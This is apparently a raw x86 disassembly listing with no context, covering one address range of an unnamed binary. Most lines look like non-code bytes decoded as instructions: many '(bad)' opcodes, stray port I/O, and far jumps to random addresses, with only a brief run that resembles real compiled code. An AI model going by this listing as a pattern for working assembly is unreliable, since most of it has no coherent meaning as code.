  411834:	sub    esp,DWORD PTR [ebx+0x5c]
  411837:	mov    al,ds:0xe6d8945d
  41183c:	dec    eax
  41183d:	sub    edx,DWORD PTR [eax+0x1127d981]
  411843:	or     esi,ebx
  411845:	dec    edx
  411846:	out    0x89,al
  411848:	pop    ebp
  411849:	call   0x55e23647
  41184e:	aas    
  41184f:	cdq    
  411850:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411851:	xchg   dl,bl
  411853:	jg     0x4118d3
  411855:	outs   dx,BYTE PTR ds:[esi]
  411856:	stos   BYTE PTR es:[edi],al
  411857:	es inc ebx
  411859:	lods   al,BYTE PTR ds:[esi]
  41185a:	enter  0x810a,0x92
  41185e:	xchg   DWORD PTR [ebx],ebx
  411860:	and    BYTE PTR [ebx+ebx*1],bl
  411863:	(bad)  
  411864:	aam    0x99
  411866:	or     BYTE PTR [esi],al
  411868:	cmp    ebp,DWORD PTR [esi+0xcefc8bc]
  41186e:	mov    ds:0xbadac10,eax
  411873:	outs   dx,BYTE PTR ds:[esi]
  411874:	mov    esi,0x29902726
  411879:	or     ebx,esp
  41187b:	daa    
  41187c:	std    
  41187d:	(bad)  
  41187e:	and    al,0x32
  411880:	cmp    esi,DWORD PTR [ebp+0xe88381]
  411886:	cmp    al,0x85
  411888:	xor    ah,BYTE PTR [ebp-0x7653d707]
  41188e:	inc    esi
  41188f:	push   ds
  411890:	ret    0x9fc0
  411893:	dec    esp
  411894:	push   eax
  411895:	jns    0x411861
  411897:	(bad)  {k7}{z}
  41189c:	xor    eax,0xb0a121b1
  4118a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118a2:	dec    eax
  4118a3:	leave  
  4118a4:	mov    eax,0x69a99d5
  4118a9:	repz mov al,0x1
  4118ac:	int3   
  4118ad:	fnsave ds:0x3f718f91
  4118b3:	cmp    al,0x25
  4118b5:	shr    BYTE PTR [ecx],1
  4118b7:	les    ecx,FWORD PTR [eax+edi*2+0x57]
  4118bb:	sub    eax,0xffffff96
  4118be:	jns    0x4118b8
  4118c0:	dec    ebx
  4118c1:	sub    eax,0x4e2c7b00
  4118c6:	sub    eax,0x907efa43
  4118cb:	out    dx,al
  4118cc:	cmc    
  4118cd:	xor    ah,cl
  4118cf:	call   0xa847fb7f
  4118d4:	rcl    BYTE PTR [ebp+0x1],0xb9
  4118d8:	in     al,dx
  4118d9:	mov    WORD PTR [esi],es
  4118db:	fs inc edx
  4118dd:	mov    ds:0xb482372b,al
  4118e2:	pop    eax
  4118e3:	jp     0x4118e5
  4118e5:	mov    bh,0x42
  4118e7:	out    dx,al
  4118e8:	ja     0x41188c
  4118ea:	pop    eax
  4118eb:	test   BYTE PTR [ebp-0x79],ah
  4118ee:	pop    ds
  4118ef:	ja     0x41192a
  4118f1:	mov    ebx,0xf1dbae9f
  4118f6:	cmc    
  4118f7:	dec    esp
  4118f8:	and    BYTE PTR [edi-0x49ad395f],bh
  4118fe:	out    dx,al
  4118ff:	lods   eax,DWORD PTR ds:[esi]
  411900:	in     al,0xa3
  411902:	loopne 0x411891
  411904:	loope  0x41192a
  411906:	shr    BYTE PTR [eax+0x71bbe84d],1
  41190c:	mov    dl,0x3a
  41190e:	dec    esi
  41190f:	in     al,0x69
  411911:	jmp    0x41194b
  411913:	xchg   edi,eax
  411914:	xor    esp,0x5e
  411917:	add    eax,ebx
  411919:	aas    
  41191a:	arpl   WORD PTR [edi+eiz*1+0x2fb22dda],bx
  411921:	mov    esp,0xf66e7cd8
  411927:	popf   
  411928:	daa    
  411929:	pop    ebx
  41192a:	or     eax,0xd09d0a54
  41192f:	fist   DWORD PTR [edi+0x55cb063c]
  411935:	pop    ds
  411936:	sbb    bl,BYTE PTR [esi-0x37]
  411939:	jge    0x41196a
  41193b:	daa    
  41193c:	js     0x4118eb
  41193e:	mov    ch,0xdb
  411940:	test   eax,0x8894dab7
  411945:	adc    eax,0x1804ecc3
  41194a:	pop    ebp
  41194b:	ja     0x41191d
  41194d:	clc    
  41194e:	inc    eax
  41194f:	lahf   
  411950:	add    edx,ecx
  411952:	call   0xbe98:0x72734832
  411959:	add    cl,BYTE PTR [ebp-0xaf07bb]
  41195f:	jne    0x411939
  411961:	push   DWORD PTR [ebp+0xc]
  411964:	call   0x413f1f
  411969:	mov    eax,DWORD PTR [ebp-0x4]
  41196c:	mov    ecx,DWORD PTR [ebp-0x8]
  41196f:	xor    eax,esi
  411971:	add    eax,edi
  411973:	cmp    ecx,eax
  411975:	je     0x413d0c
  41197b:	mov    eax,DWORD PTR [ebp-0x34]
  41197e:	movzx  eax,WORD PTR [eax+ebx*2]
  411982:	jmp    0x413cfe
  411987:	mov    esp,0x8265841a
  41198c:	loope  0x41192c
  41198e:	add    BYTE PTR [eax+0x74],0x97
  411992:	es iret 
  411994:	mov    ecx,0x8b10af8d
  411999:	add    DWORD PTR [ebx-0x7c7ca1de],0xfffffffe
  4119a0:	push   edx
  4119a1:	add    BYTE PTR [ebx+0x2a],dh
  4119a4:	in     al,dx
  4119a5:	rcr    BYTE PTR [ebx+0x7472e738],cl
  4119ab:	push   edx
  4119ac:	pop    edx
  4119ad:	jp     0x411a25
  4119af:	(bad)  
  4119b0:	retf   
  4119b1:	mov    WORD PTR [ebx+0x434bd8af],ss
  4119b7:	jle    0x41195b
  4119b9:	bound  edx,QWORD PTR [ebx-0x64]
  4119bc:	push   es
  4119bd:	jp     0x41195f
  4119bf:	jne    0x4119c8
  4119c1:	sti    
  4119c2:	adc    eax,edi
  4119c4:	pusha  
  4119c5:	fwait
  4119c6:	shl    BYTE PTR [edi],1
  4119c8:	ds addr16 mov bl,0x4a
  4119cc:	inc    edi
  4119cd:	mul    ah
  4119cf:	dec    ecx
  4119d0:	or     BYTE PTR [ecx+0x6a7e15f6],bl
  4119d6:	lds    ecx,FWORD PTR [ebx]
  4119d8:	pop    es
  4119d9:	stos   BYTE PTR es:[edi],al
  4119da:	dec    eax
  4119db:	sbb    ecx,edi
  4119dd:	lods   al,BYTE PTR ds:[esi]
  4119de:	fidiv  WORD PTR [edi+0x744ff4a5]
  4119e4:	ja     0x411969
  4119e6:	aas    
  4119e7:	test   BYTE PTR [ecx-0x7a],bl
  4119ea:	push   0x4
  4119ec:	js     0x4119dc
  4119ee:	jo     0x4119ca
  4119f0:	mov    ds:0xa5b36a8c,eax
  4119f5:	enter  0x4de7,0x4
  4119f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4119fa:	sub    BYTE PTR [edx+0x2eb540eb],dh
  411a00:	int3   
  411a01:	and    bh,BYTE PTR [ebx-0x6e]
  411a04:	mov    dl,0x42
  411a06:	shl    DWORD PTR [edx],1
  411a08:	shl    DWORD PTR [edx+0x26],0x94
  411a0c:	jne    0x4119f2
  411a0e:	add    DWORD PTR [esp+esi*2+0x2e],esp
  411a12:	int3   
  411a13:	dec    edi
  411a14:	inc    eax
  411a15:	sbb    al,0x67
  411a17:	aaa    
  411a18:	ficom  WORD PTR [edx-0x3956d0f8]
  411a1e:	lods   al,BYTE PTR ds:[esi]
  411a1f:	js     0x4119d5
  411a21:	sub    ebx,ecx
  411a23:	push   ds
  411a24:	ret    0x3fe7
  411a27:	adc    cl,BYTE PTR [ecx+0x43ed0717]
  411a2d:	and    BYTE PTR [ecx-0x7211bda2],bh
  411a33:	fdivr  QWORD PTR [eax]
  411a35:	mov    BYTE PTR [esi],dh
  411a37:	adc    ch,BYTE PTR [edx-0x6f829157]
  411a3d:	cwde   
  411a3e:	rcl    cl,cl
  411a40:	fidiv  DWORD PTR [eax-0x57c483a1]
  411a46:	sbb    esi,DWORD PTR [ebx-0x76]
  411a49:	hlt    
  411a4a:	test   eax,0x714e65ff
  411a4f:	inc    esi
  411a50:	(bad)  
  411a51:	sti    
  411a52:	inc    ebp
  411a53:	test   eax,0x76d8009e
  411a58:	adc    eax,0x339a2e73
  411a5d:	xchg   esp,eax
  411a5e:	lahf   
  411a5f:	imul   eax,DWORD PTR [eax-0x669b2970],0xf031802b
  411a69:	inc    edx
  411a6a:	ror    cl,1
  411a6c:	scas   al,BYTE PTR es:[edi]
  411a6d:	xchg   esi,eax
  411a6e:	push   edx
  411a6f:	pop    edi
  411a70:	out    0xff,al
  411a72:	and    BYTE PTR [edx],dl
  411a74:	fcmovbe st,st(0)
  411a76:	pop    ebp
  411a77:	aam    0x82
  411a79:	stos   BYTE PTR es:[edi],al
  411a7a:	adc    ebp,ebx
  411a7c:	pop    ebp
  411a7d:	and    dl,dl
  411a7f:	in     eax,0xd9
  411a81:	jne    0x411ab5
  411a83:	ror    ah,cl
  411a85:	std    
  411a86:	(bad)  [ebx-0x5a]
  411a89:	push   es
  411a8a:	pop    ecx
  411a8b:	or     esp,ebp
  411a8d:	push   es
  411a8e:	pop    edi
  411a8f:	sub    al,0x58
  411a91:	add    bl,dh
  411a93:	dec    esp
  411a94:	js     0x411a1d
  411a96:	sub    esi,DWORD PTR [edi+ebx*4+0x62]
  411a9a:	mov    bh,0x3b
  411a9c:	ret    0xdc66
  411a9f:	dec    esi
  411aa0:	popa   
  411aa1:	mov    ds:0x19268309,eax
  411aa6:	enter  0xb5f6,0x51
  411aaa:	int    0xde
  411aac:	inc    eax
  411aad:	(bad)  
  411aae:	dec    ebx
  411aaf:	push   ds
  411ab0:	sbb    BYTE PTR [edi-0x1ab0b02a],bl
  411ab6:	out    0x69,al
  411ab8:	jg     0x411a81
  411aba:	fist   WORD PTR [esi+0x65]
  411abd:	dec    ebp
  411abe:	popf   
  411abf:	loop   0x411b36
  411ac1:	test   eax,0xe3e04b39
  411ac6:	outs   dx,BYTE PTR ds:[esi]
  411ac7:	push   ebp
  411ac8:	xchg   esp,eax
  411ac9:	popa   
  411aca:	call   0x4ac792b8
  411acf:	aad    0x7e
  411ad1:	aam    0x78
  411ad3:	mov    DWORD PTR [ecx-0x40a3213d],0x306a9a4
  411add:	mov    edx,0x3adfd91c
  411ae2:	out    0xa4,al
  411ae4:	hlt    
  411ae5:	js     0x411a69
  411ae7:	add    al,0x43
  411ae9:	and    ch,BYTE PTR [eax]
  411aeb:	xlat   BYTE PTR ds:[ebx]
  411aec:	bound  esi,QWORD PTR [ebp-0x437d6d52]
  411af2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411af3:	and    DWORD PTR [esp+eax*8-0x74fb62b0],edx
  411afa:	test   eax,0xc3224046
  411aff:	add    eax,0x149e0f65
  411b04:	bound  esi,QWORD PTR [edi-0x6]
  411b07:	fwait
  411b08:	xchg   BYTE PTR [edx+0xb6cf64f],al
  411b0e:	imul   ecx,ebp,0xffffff81
  411b11:	adc    bh,BYTE PTR [edx+0x4f22a232]
  411b17:	jle    0x411b98
  411b19:	clc    
  411b1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b1b:	jb     0x411b7b
  411b1d:	in     eax,0xb1
  411b1f:	retf   
  411b20:	std    
  411b21:	pop    edx
  411b22:	inc    ecx
  411b23:	jp     0x411b46
  411b25:	test   edx,edi
  411b27:	ins    DWORD PTR es:[edi],dx
  411b28:	dec    ebx
  411b29:	retf   
  411b2a:	push   ebp
  411b2b:	loop   0x411af4
  411b2d:	fstp   st(0)
  411b2f:	jbe    0x411abc
  411b31:	dec    esi
  411b32:	inc    edi
  411b33:	(bad)  
  411b34:	ja     0x411b69
  411b36:	sub    DWORD PTR [ebp-0x51],ecx
  411b39:	dec    ebp
  411b3a:	dec    eax
  411b3b:	ss (bad) 
  411b3d:	mov    ebx,edi
  411b3f:	dec    esi
  411b40:	retf   0xe53f
  411b43:	sbb    BYTE PTR ds:0xc1222a2f,dh
  411b49:	pop    ebp
  411b4a:	xor    BYTE PTR ds:0xc6cb8c97,dh
  411b50:	icebp  
  411b51:	push   esp
  411b52:	xchg   BYTE PTR [edi],bh
  411b54:	push   ebx
  411b55:	iret   
  411b56:	pop    es
  411b57:	mov    al,0xe4
  411b59:	out    dx,eax
  411b5a:	data16 (bad) 
  411b5c:	(bad)  
  411b5d:	cmp    esp,DWORD PTR [edi+0x4de351b0]
  411b63:	out    dx,al
  411b64:	mov    esp,0xaf966a39
  411b69:	mov    ?,ecx
  411b6b:	inc    esp
  411b6c:	jbe    0x411b45
  411b6e:	ja     0x411b6a
  411b70:	dec    eax
  411b71:	sub    ecx,DWORD PTR [esi-0x19]
  411b74:	mov    ebp,0x9c2dc424
  411b79:	out    0x0,eax
  411b7b:	xchg   ebp,eax
  411b7c:	mov    ah,0xdf
  411b7e:	pop    eax
  411b7f:	ror    BYTE PTR [edi],cl
  411b81:	xor    dh,BYTE PTR [edx+0x18]
  411b84:	outs   dx,DWORD PTR ds:[esi]
  411b85:	mov    bl,0x6c
  411b87:	mov    dl,0x95
  411b89:	ret    
  411b8a:	adc    ah,bh
  411b8c:	ret    0xa202
  411b8f:	inc    ebp
  411b90:	jo     0x411b45
  411b92:	push   ebp
  411b93:	sub    BYTE PTR [eax-0x5b],0xba
  411b97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b98:	xor    dh,bl
  411b9a:	ja     0x411ba8
  411b9c:	mov    al,ds:0xa4df8425
  411ba1:	dec    ebx
  411ba2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411ba3:	fcom   QWORD PTR [eax+0x6f]
  411ba6:	cmp    eax,DWORD PTR [edx]
  411ba8:	cli    
  411ba9:	call   0x8a08c4c4
  411bae:	aaa    
  411baf:	mov    al,0x7
  411bb1:	arpl   WORD PTR [eax+esi*4+0x5f],si
  411bb5:	jno    0x411c1f
  411bb7:	sbb    ah,BYTE PTR [ebp-0x33]
  411bba:	aaa    
  411bbb:	leave  
  411bbc:	xchg   esp,eax
  411bbd:	or     ecx,ebx
  411bbf:	jmp    0xd948:0xe7930389
  411bc6:	add    al,0x36
  411bc8:	xchg   ebx,eax
  411bc9:	stos   BYTE PTR es:[edi],al
  411bca:	data16 mov dl,0x36
  411bcd:	test   eax,0x908e4f65
  411bd2:	cmp    BYTE PTR [ebx],cl
  411bd4:	xchg   esi,eax
  411bd5:	mov    edx,eax
  411bd7:	test   BYTE PTR [eax],dh
  411bd9:	sub    DWORD PTR [esi],esp
  411bdb:	mov    ss,WORD PTR [esi-0x49]
  411bde:	jmp    0x46e5:0xd0faa1d1
  411be5:	lahf   
  411be6:	xchg   BYTE PTR cs:[edi+0x7a66f17f],cl
  411bed:	test   al,0xe9
  411bef:	sub    DWORD PTR [esi-0x51],edx
  411bf2:	mov    esi,0x783a6523
  411bf7:	ss mov dl,0x86
  411bfa:	scas   eax,DWORD PTR es:[edi]
  411bfb:	mov    eax,ebx
  411bfd:	xchg   esp,eax
  411bfe:	das    
  411bff:	daa    
  411c00:	adc    eax,0xadb2e433
  411c05:	dec    edi
  411c06:	aad    0x93
  411c08:	jmp    0xcbaa:0xf36cbeb
  411c0f:	bnd ret 0x403
  411c13:	cld    
  411c14:	in     eax,0x94
  411c16:	mov    ebx,0xc44604bd
  411c1b:	mov    BYTE PTR [eax+0x32c74da5],bh
  411c21:	iret   
  411c22:	into   
  411c23:	js     0x411c8d
  411c25:	(bad)  [ecx]
  411c27:	and    edx,DWORD PTR [esi-0x80]
  411c2a:	cdq    
  411c2b:	inc    ebp
  411c2c:	sub    eax,0xc1d16213
  411c31:	mov    eax,0x8f37eee8
  411c36:	dec    edx
  411c37:	and    eax,0x36bf93b6
  411c3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c3d:	ss cdq 
  411c3f:	pminub mm5,QWORD PTR [edi]
  411c42:	xchg   ebx,eax
  411c43:	push   es
  411c44:	add    BYTE PTR [edi-0x32a7de8e],bh
  411c4a:	jl     0x411c44
  411c4c:	mov    BYTE PTR [eax-0x3311f0ae],bh
  411c52:	inc    ebx
  411c53:	jmp    0xf815ac74
  411c58:	idiv   BYTE PTR [ecx-0x22]
  411c5b:	sbb    ebx,DWORD PTR [edx-0x63]
  411c5e:	call   0x2e57:0x1aabdc61
  411c65:	jns    0x411cce
  411c67:	mov    eax,0xd9fdf879
  411c6c:	add    eax,0x15703a33
  411c71:	xchg   ecx,eax
  411c72:	inc    ebp
  411c73:	sub    al,0xf3
  411c75:	mov    al,BYTE PTR [edx-0x769fa5a5]
  411c7b:	scas   eax,DWORD PTR es:[edi]
  411c7c:	jo     0x411ca8
  411c7e:	sbb    BYTE PTR [ebp+0x6450af8a],bh
  411c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c85:	fs arpl sp,di
  411c88:	out    0xa5,al
  411c8a:	mov    eax,ds:0xa6274455
  411c8f:	mov    esi,DWORD PTR [edx+edx*1]
  411c92:	or     ecx,eax
  411c94:	pop    edx
  411c95:	js     0x411cd6
  411c97:	daa    
  411c98:	mov    ebp,0xff9d3ba2
  411c9d:	mov    ch,0x79
  411c9f:	and    esp,DWORD PTR [ecx+0x41389639]
  411ca5:	and    al,0x2
  411ca7:	dec    eax
  411ca8:	es or  eax,0x8e3bb5cc
  411cae:	or     esp,DWORD PTR [esi]
  411cb0:	mov    WORD PTR [esp+eax*2-0x27],ds
  411cb4:	and    al,0x9d
  411cb6:	mov    ebp,0x387e8819
  411cbb:	push   eax
  411cbc:	fidivr WORD PTR [ecx-0x733569fa]
  411cc2:	pop    esp
  411cc3:	popf   
  411cc4:	retf   
  411cc5:	push   esi
  411cc6:	push   cs
  411cc7:	sbb    al,0x7a
  411cc9:	jg     0x411d4a
  411ccb:	aad    0xe8
  411ccd:	rcl    edi,1
  411ccf:	bound  ebx,QWORD PTR [eax+0x27]
  411cd2:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  411cd4:	fcomip st,st(7)
  411cd6:	push   eax
  411cd7:	sar    BYTE PTR [ecx+edx*4+0x441f625e],1
  411cde:	pusha  
  411cdf:	repnz mov edi,0x3d1814d3
  411ce5:	sbb    DWORD PTR [ebp+0x7],0xffffff8f
  411ce9:	pop    eax
  411cea:	jge    0x411d6a
  411cec:	in     eax,0x78
  411cee:	and    DWORD PTR [ebp+0x4e],edi
  411cf1:	mov    esi,0xd243c83b
  411cf6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411cf7:	cdq    
  411cf8:	push   0xffffff8f
  411cfa:	ja     0x411d72
  411cfc:	pushf  
  411cfd:	or     DWORD PTR [edx-0x7b4060eb],0x7a
  411d04:	das    
  411d05:	jno    0x411c9a
  411d07:	mov    esp,0x910e450
  411d0c:	or     ah,BYTE PTR [ebx+0x7c115f92]
  411d12:	(bad)  
  411d13:	xor    bl,BYTE PTR [eax]
  411d15:	aam    0xed
  411d17:	ret    
  411d18:	shl    BYTE PTR [ebp+0x3b],1
  411d1b:	es in  eax,0x5c
  411d1e:	pop    ds
  411d1f:	push   0x8ef935a7
  411d24:	ins    BYTE PTR es:[edi],dx
  411d25:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d26:	sbb    eax,0xdb079ca3
  411d2b:	(bad)  
  411d2c:	in     al,dx
  411d2d:	dec    eax
  411d2e:	xchg   edi,eax
  411d2f:	add    eax,0x1125be11
  411d34:	mov    cl,0xa6
  411d36:	push   0xffffff8d
  411d38:	dec    ecx
  411d39:	pop    ebx
  411d3a:	pop    esp
  411d3b:	add    dl,dl
  411d3d:	sbb    al,0x25
  411d3f:	cmp    cl,BYTE PTR [eax]
  411d41:	xchg   esi,eax
  411d42:	jmp    0x6c8c:0x6f599a6d
  411d49:	ss inc eax
  411d4b:	jecxz  0x411cd7
  411d4d:	aaa    
  411d4e:	mov    esp,0xfa86a4ca
  411d53:	push   ecx
  411d54:	and    BYTE PTR [esi+0x0],dh
  411d57:	and    edi,DWORD PTR [ebx]
  411d59:	xchg   edi,eax
  411d5a:	cmp    eax,0xf954fa3a
  411d5f:	bound  ecx,QWORD PTR [esp+ebp*2+0x2943af54]
  411d66:	popf   
  411d67:	das    
  411d68:	dec    esp
  411d69:	cmp    DWORD PTR [ebx],ebx
  411d6b:	mov    eax,0x12518417
  411d70:	xchg   ecx,eax
  411d71:	jecxz  0x411d1d
  411d73:	jle    0x411d02
  411d75:	fst    DWORD PTR [eax+0x4f]
  411d78:	xchg   ebx,eax
  411d79:	pusha  
  411d7a:	test   eax,0x9adc8006
  411d7f:	pop    ecx
  411d80:	out    dx,al
  411d81:	inc    edi
  411d82:	pop    eax
  411d83:	das    
  411d84:	or     eax,0xe791204c
  411d89:	push   es
  411d8a:	dec    esi
  411d8b:	ficom  DWORD PTR [edx+0x2450b58c]
  411d91:	ins    BYTE PTR es:[edi],dx
  411d92:	mov    dh,cl
  411d94:	jecxz  0x411ddc
  411d96:	xor    eax,0xc4c4bc92
  411d9b:	pop    es
  411d9c:	es sbb eax,0x970b7714
  411da2:	dec    edx
  411da3:	cmp    BYTE PTR [edx],0x2c
  411da6:	js     0x411d66
  411da8:	sbb    DWORD PTR [ebp-0x12],0xfffffff2
  411dac:	mov    bl,0x17
  411dae:	call   0xb285:0x95ce1d03
  411db5:	sbb    BYTE PTR [edx+eiz*2-0x42],cl
  411db9:	ins    DWORD PTR es:[edi],dx
  411dba:	sub    cl,BYTE PTR [edi]
  411dbc:	sbb    dh,BYTE PTR [edi+0x30]
  411dbf:	out    dx,eax
  411dc0:	js     0x411d93
  411dc2:	ins    BYTE PTR es:[edi],dx
  411dc3:	jge    0x411d76
  411dc5:	lock outs dx,BYTE PTR ds:[esi]
  411dc7:	inc    edi
  411dc8:	in     eax,dx
  411dc9:	or     BYTE PTR [esi],bh
  411dcb:	mov    es,WORD PTR ds:0x3924512e
  411dd1:	jae    0x411d92
  411dd3:	loopne 0x411d77
  411dd5:	nop
  411dd6:	setne  BYTE PTR [esi+0x496fcfe9]
  411ddd:	sbb    al,BYTE PTR [eax]
  411ddf:	xchg   edx,eax
  411de0:	js     0x411db6
  411de2:	xchg   esi,eax
  411de3:	mov    cl,0x4e
  411de5:	jle    0x411e04
  411de7:	mov    eax,0x8ed51d74
  411dec:	repz inc ebx
  411dee:	cmp    eax,DWORD PTR [ebp+0x145eed57]
  411df4:	loopne 0x411db2
  411df6:	fmul   st,st(4)
  411df8:	mov    ds:0x131eaae0,al
  411dfd:	sbb    BYTE PTR [edi-0x33],0xaa
  411e01:	out    dx,eax
  411e02:	lahf   
  411e03:	jno    0x411e0e
  411e05:	xchg   edi,eax
  411e06:	push   ebx
  411e07:	jbe    0x411dc1
  411e09:	or     al,0x3c
  411e0b:	lods   eax,DWORD PTR ds:[esi]
  411e0c:	mov    al,0x79
  411e0e:	mov    DWORD PTR [eax+0x7d],eax
  411e11:	mov    ss,WORD PTR [esi+0x6a]
  411e14:	(bad)  
  411e15:	sub    eax,0x70335479
  411e1a:	div    BYTE PTR [ecx+0x67]
  411e1d:	cmp    al,0x7d
  411e1f:	aad    0xaf
  411e21:	mov    WORD PTR [ecx-0x6e65d797],ds
  411e27:	inc    esi
  411e28:	adc    ebp,edx
  411e2a:	ins    DWORD PTR es:[edi],dx
  411e2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411e2c:	and    al,ch
  411e2e:	loop   0x411e07
  411e30:	ss clc 
  411e32:	jmp    0x411e0e
  411e34:	das    
  411e35:	mov    DWORD PTR [eax+0x52c61a6],esi
  411e3b:	mov    edx,0x3bb07011
  411e40:	lods   eax,DWORD PTR ds:[esi]
  411e41:	(bad)  
  411e42:	xor    eax,0x8a64949
  411e47:	adc    dl,0x2f
  411e4a:	dec    ebp
  411e4b:	sub    al,0xce
  411e4d:	sbb    al,0xdf
  411e4f:	pop    ds
  411e50:	xlat   BYTE PTR ds:[ebx]
  411e51:	es inc edx
  411e53:	out    0xe1,al
  411e55:	sbb    esp,0x52b24142
  411e5b:	stos   DWORD PTR es:[edi],eax
  411e5c:	xchg   esp,eax
  411e5d:	mov    ah,0xd6
  411e5f:	shr    DWORD PTR [ecx-0x347c8f0b],cl
  411e65:	or     BYTE PTR [esi-0x7e],bl
  411e68:	jmp    0xb8d6:0x79388a98
  411e6f:	test   bl,al
  411e71:	cmc    
  411e72:	repz fs jl 0x411ecc
  411e76:	dec    esp
  411e77:	cmp    al,0x89
  411e79:	sub    bl,BYTE PTR [ebp-0x1fd687b6]
  411e7f:	loopne 0x411e92
  411e81:	xchg   ebx,eax
  411e82:	leave  
  411e83:	sbb    al,0xb6
  411e85:	push   cs
  411e86:	push   esi
  411e87:	dec    ecx
  411e88:	push   esi
  411e89:	pop    ebp
  411e8a:	dec    esp
  411e8b:	dec    ebx
  411e8c:	mov    DWORD PTR [eax+ebp*2],esi
  411e8f:	enter  0xc92,0x1b
  411e93:	out    0x39,eax
  411e95:	xor    DWORD PTR [ebx],esi
  411e97:	xchg   ecx,eax
  411e98:	aas    
  411e99:	imul   ebp,edx,0x49
  411e9c:	and    ebx,esi
  411e9e:	mov    edx,0x8004f184
  411ea3:	ins    DWORD PTR es:[edi],dx
  411ea4:	push   esi
  411ea5:	pop    edx
  411ea6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411ea7:	retf   
  411ea8:	mov    al,0x17
  411eaa:	pop    ds
  411eab:	sbb    eax,0xfafbefb5
  411eb0:	jmp    0x80351aa6
  411eb5:	jl     0x411f28
  411eb7:	bound  esp,QWORD PTR [ecx+0x7e]
  411eba:	pusha  
  411ebb:	popf   
  411ebc:	mov    al,0xb4
  411ebe:	sub    al,0x9e
  411ec0:	fadd   DWORD PTR [esi]
  411ec2:	or     al,0x3
  411ec4:	(bad)  
  411ec5:	jne    0x411e8c
  411ec7:	pop    ebx
  411ec8:	jle    0x411edb
  411eca:	in     al,dx
  411ecb:	out    0xbb,al
  411ecd:	add    BYTE PTR [edi],cl
  411ecf:	lahf   
  411ed0:	imul   esi,DWORD PTR [ebp+0x30],0x7b63640a
  411ed7:	or     DWORD PTR ds:0x2946ca8b,0xfbcca1a1
  411ee1:	daa    
  411ee2:	jmp    0xa1a1:0xa2f1f29c
  411ee9:	and    al,0x3a
  411eeb:	test   eax,0x4c74609f
  411ef0:	push   esi
  411ef1:	in     eax,dx
  411ef2:	inc    eax
  411ef3:	push   es
  411ef4:	or     eax,0x24cb8b80
  411ef9:	test   eax,0xdce8871f
  411efe:	cld    
  411eff:	pusha  
  411f00:	mov    bh,0xf6
  411f02:	and    BYTE PTR [edi],0x16
  411f05:	je     0x411e97
  411f07:	shl    eax,1
  411f09:	vdivsd xmm4,xmm5,QWORD PTR [edx+0x77]
  411f0e:	loope  0x411f5a
  411f10:	mov    ch,0xb9
  411f12:	int3   
  411f13:	dec    ebx
  411f14:	(bad)  
  411f15:	clc    
  411f16:	std    
  411f17:	imul   DWORD PTR [eax+0x2b861719]
  411f1d:	cmc    
  411f1e:	mov    ch,0x79
  411f20:	arpl   WORD PTR [eax],cx
  411f22:	loop   0x411f24
  411f24:	or     DWORD PTR ds:0x9b055e74,0x109abfc
  411f2e:	loop   0x411f0a
  411f30:	jl     0x411ee1
  411f32:	and    BYTE PTR [eax+eiz*4],dl
  411f35:	mov    BYTE PTR [esi-0x76],al
  411f38:	mov    WORD PTR [edx+eiz*1+0x12],?
  411f3c:	clc    
  411f3d:	int    0xdb
  411f3f:	enter  0x3b90,0x52
  411f43:	sbb    al,BYTE PTR [ecx-0x4f8787f9]
  411f49:	sbb    al,0x6c
  411f4b:	jge    0x411f6f
  411f4d:	popf   
  411f4e:	mov    ecx,0x32736bcf
  411f53:	mov    eax,0xe3f492a9
  411f58:	arpl   WORD PTR [bx+si+0x78d0],sp
  411f5d:	adc    al,0x53
  411f5f:	inc    esp
  411f60:	push   ds
  411f61:	xor    edx,DWORD PTR [ebx]
  411f63:	fwait
  411f64:	ja     0x411fb2
  411f66:	ret    
  411f67:	jo     0x411fcd
  411f69:	xchg   edi,eax
  411f6a:	(bad)  
  411f6c:	sbb    DWORD PTR [edi+0x55346d2e],esp
  411f72:	shr    bl,0x50
  411f75:	rcr    BYTE PTR [esp+eax*8],0xc1
  411f79:	(bad)  
  411f7c:	mov    ch,0x33
  411f7e:	push   fs
  411f80:	mov    esp,0x6f22a437
  411f85:	lahf   
  411f86:	mov    ?,esp
  411f88:	inc    ecx
  411f89:	outs   dx,DWORD PTR ds:[esi]
  411f8a:	and    cl,BYTE PTR [eax+0x5bcbd132]
  411f90:	ret    0x244f
  411f93:	cmc    
  411f94:	fsubr  QWORD PTR [esi+0x39fc04a]
  411f9a:	jmp    FWORD PTR [ebp+0xc]
  411f9d:	pop    edi
  411f9e:	dec    edx
  411f9f:	pop    ds
  411fa0:	sub    edx,DWORD PTR [edi-0x3d]
  411fa3:	outs   dx,DWORD PTR ds:[esi]
  411fa4:	iret   
  411fa5:	sub    eax,DWORD PTR [esp+ebx*1-0x22]
  411fa9:	addr16 pshufw mm1,mm3,0xb3
  411fae:	add    cl,bl
  411fb0:	and    BYTE PTR [ebp-0x3e],al
  411fb3:	outs   dx,BYTE PTR ds:[esi]
  411fb4:	mov    ecx,0xc8378f67
  411fb9:	sti    
  411fba:	fldcw  WORD PTR [edx+0x30]
  411fbd:	adc    ebp,DWORD PTR [eax+0x55]
  411fc0:	aas    
  411fc1:	retf   
  411fc2:	or     dl,bl
  411fc4:	mov    dh,0xdd
  411fc6:	xchg   edi,eax
  411fc7:	sbb    BYTE PTR [eax-0x32],ch
  411fca:	in     eax,dx
  411fcb:	xor    DWORD PTR [edi-0xbf6352f],0xffffffa7
  411fd2:	jge    0x411fe1
  411fd4:	add    bl,bh
  411fd6:	neg    BYTE PTR [esi+0x3aafc510]
  411fdc:	add    ecx,DWORD PTR [esi]
  411fde:	add    esp,DWORD PTR [eax+edx*4]
  411fe1:	scas   al,BYTE PTR es:[edi]
  411fe2:	cwde   
  411fe3:	mov    esi,0x8256e336
  411fe8:	pop    ecx
  411fe9:	inc    esp
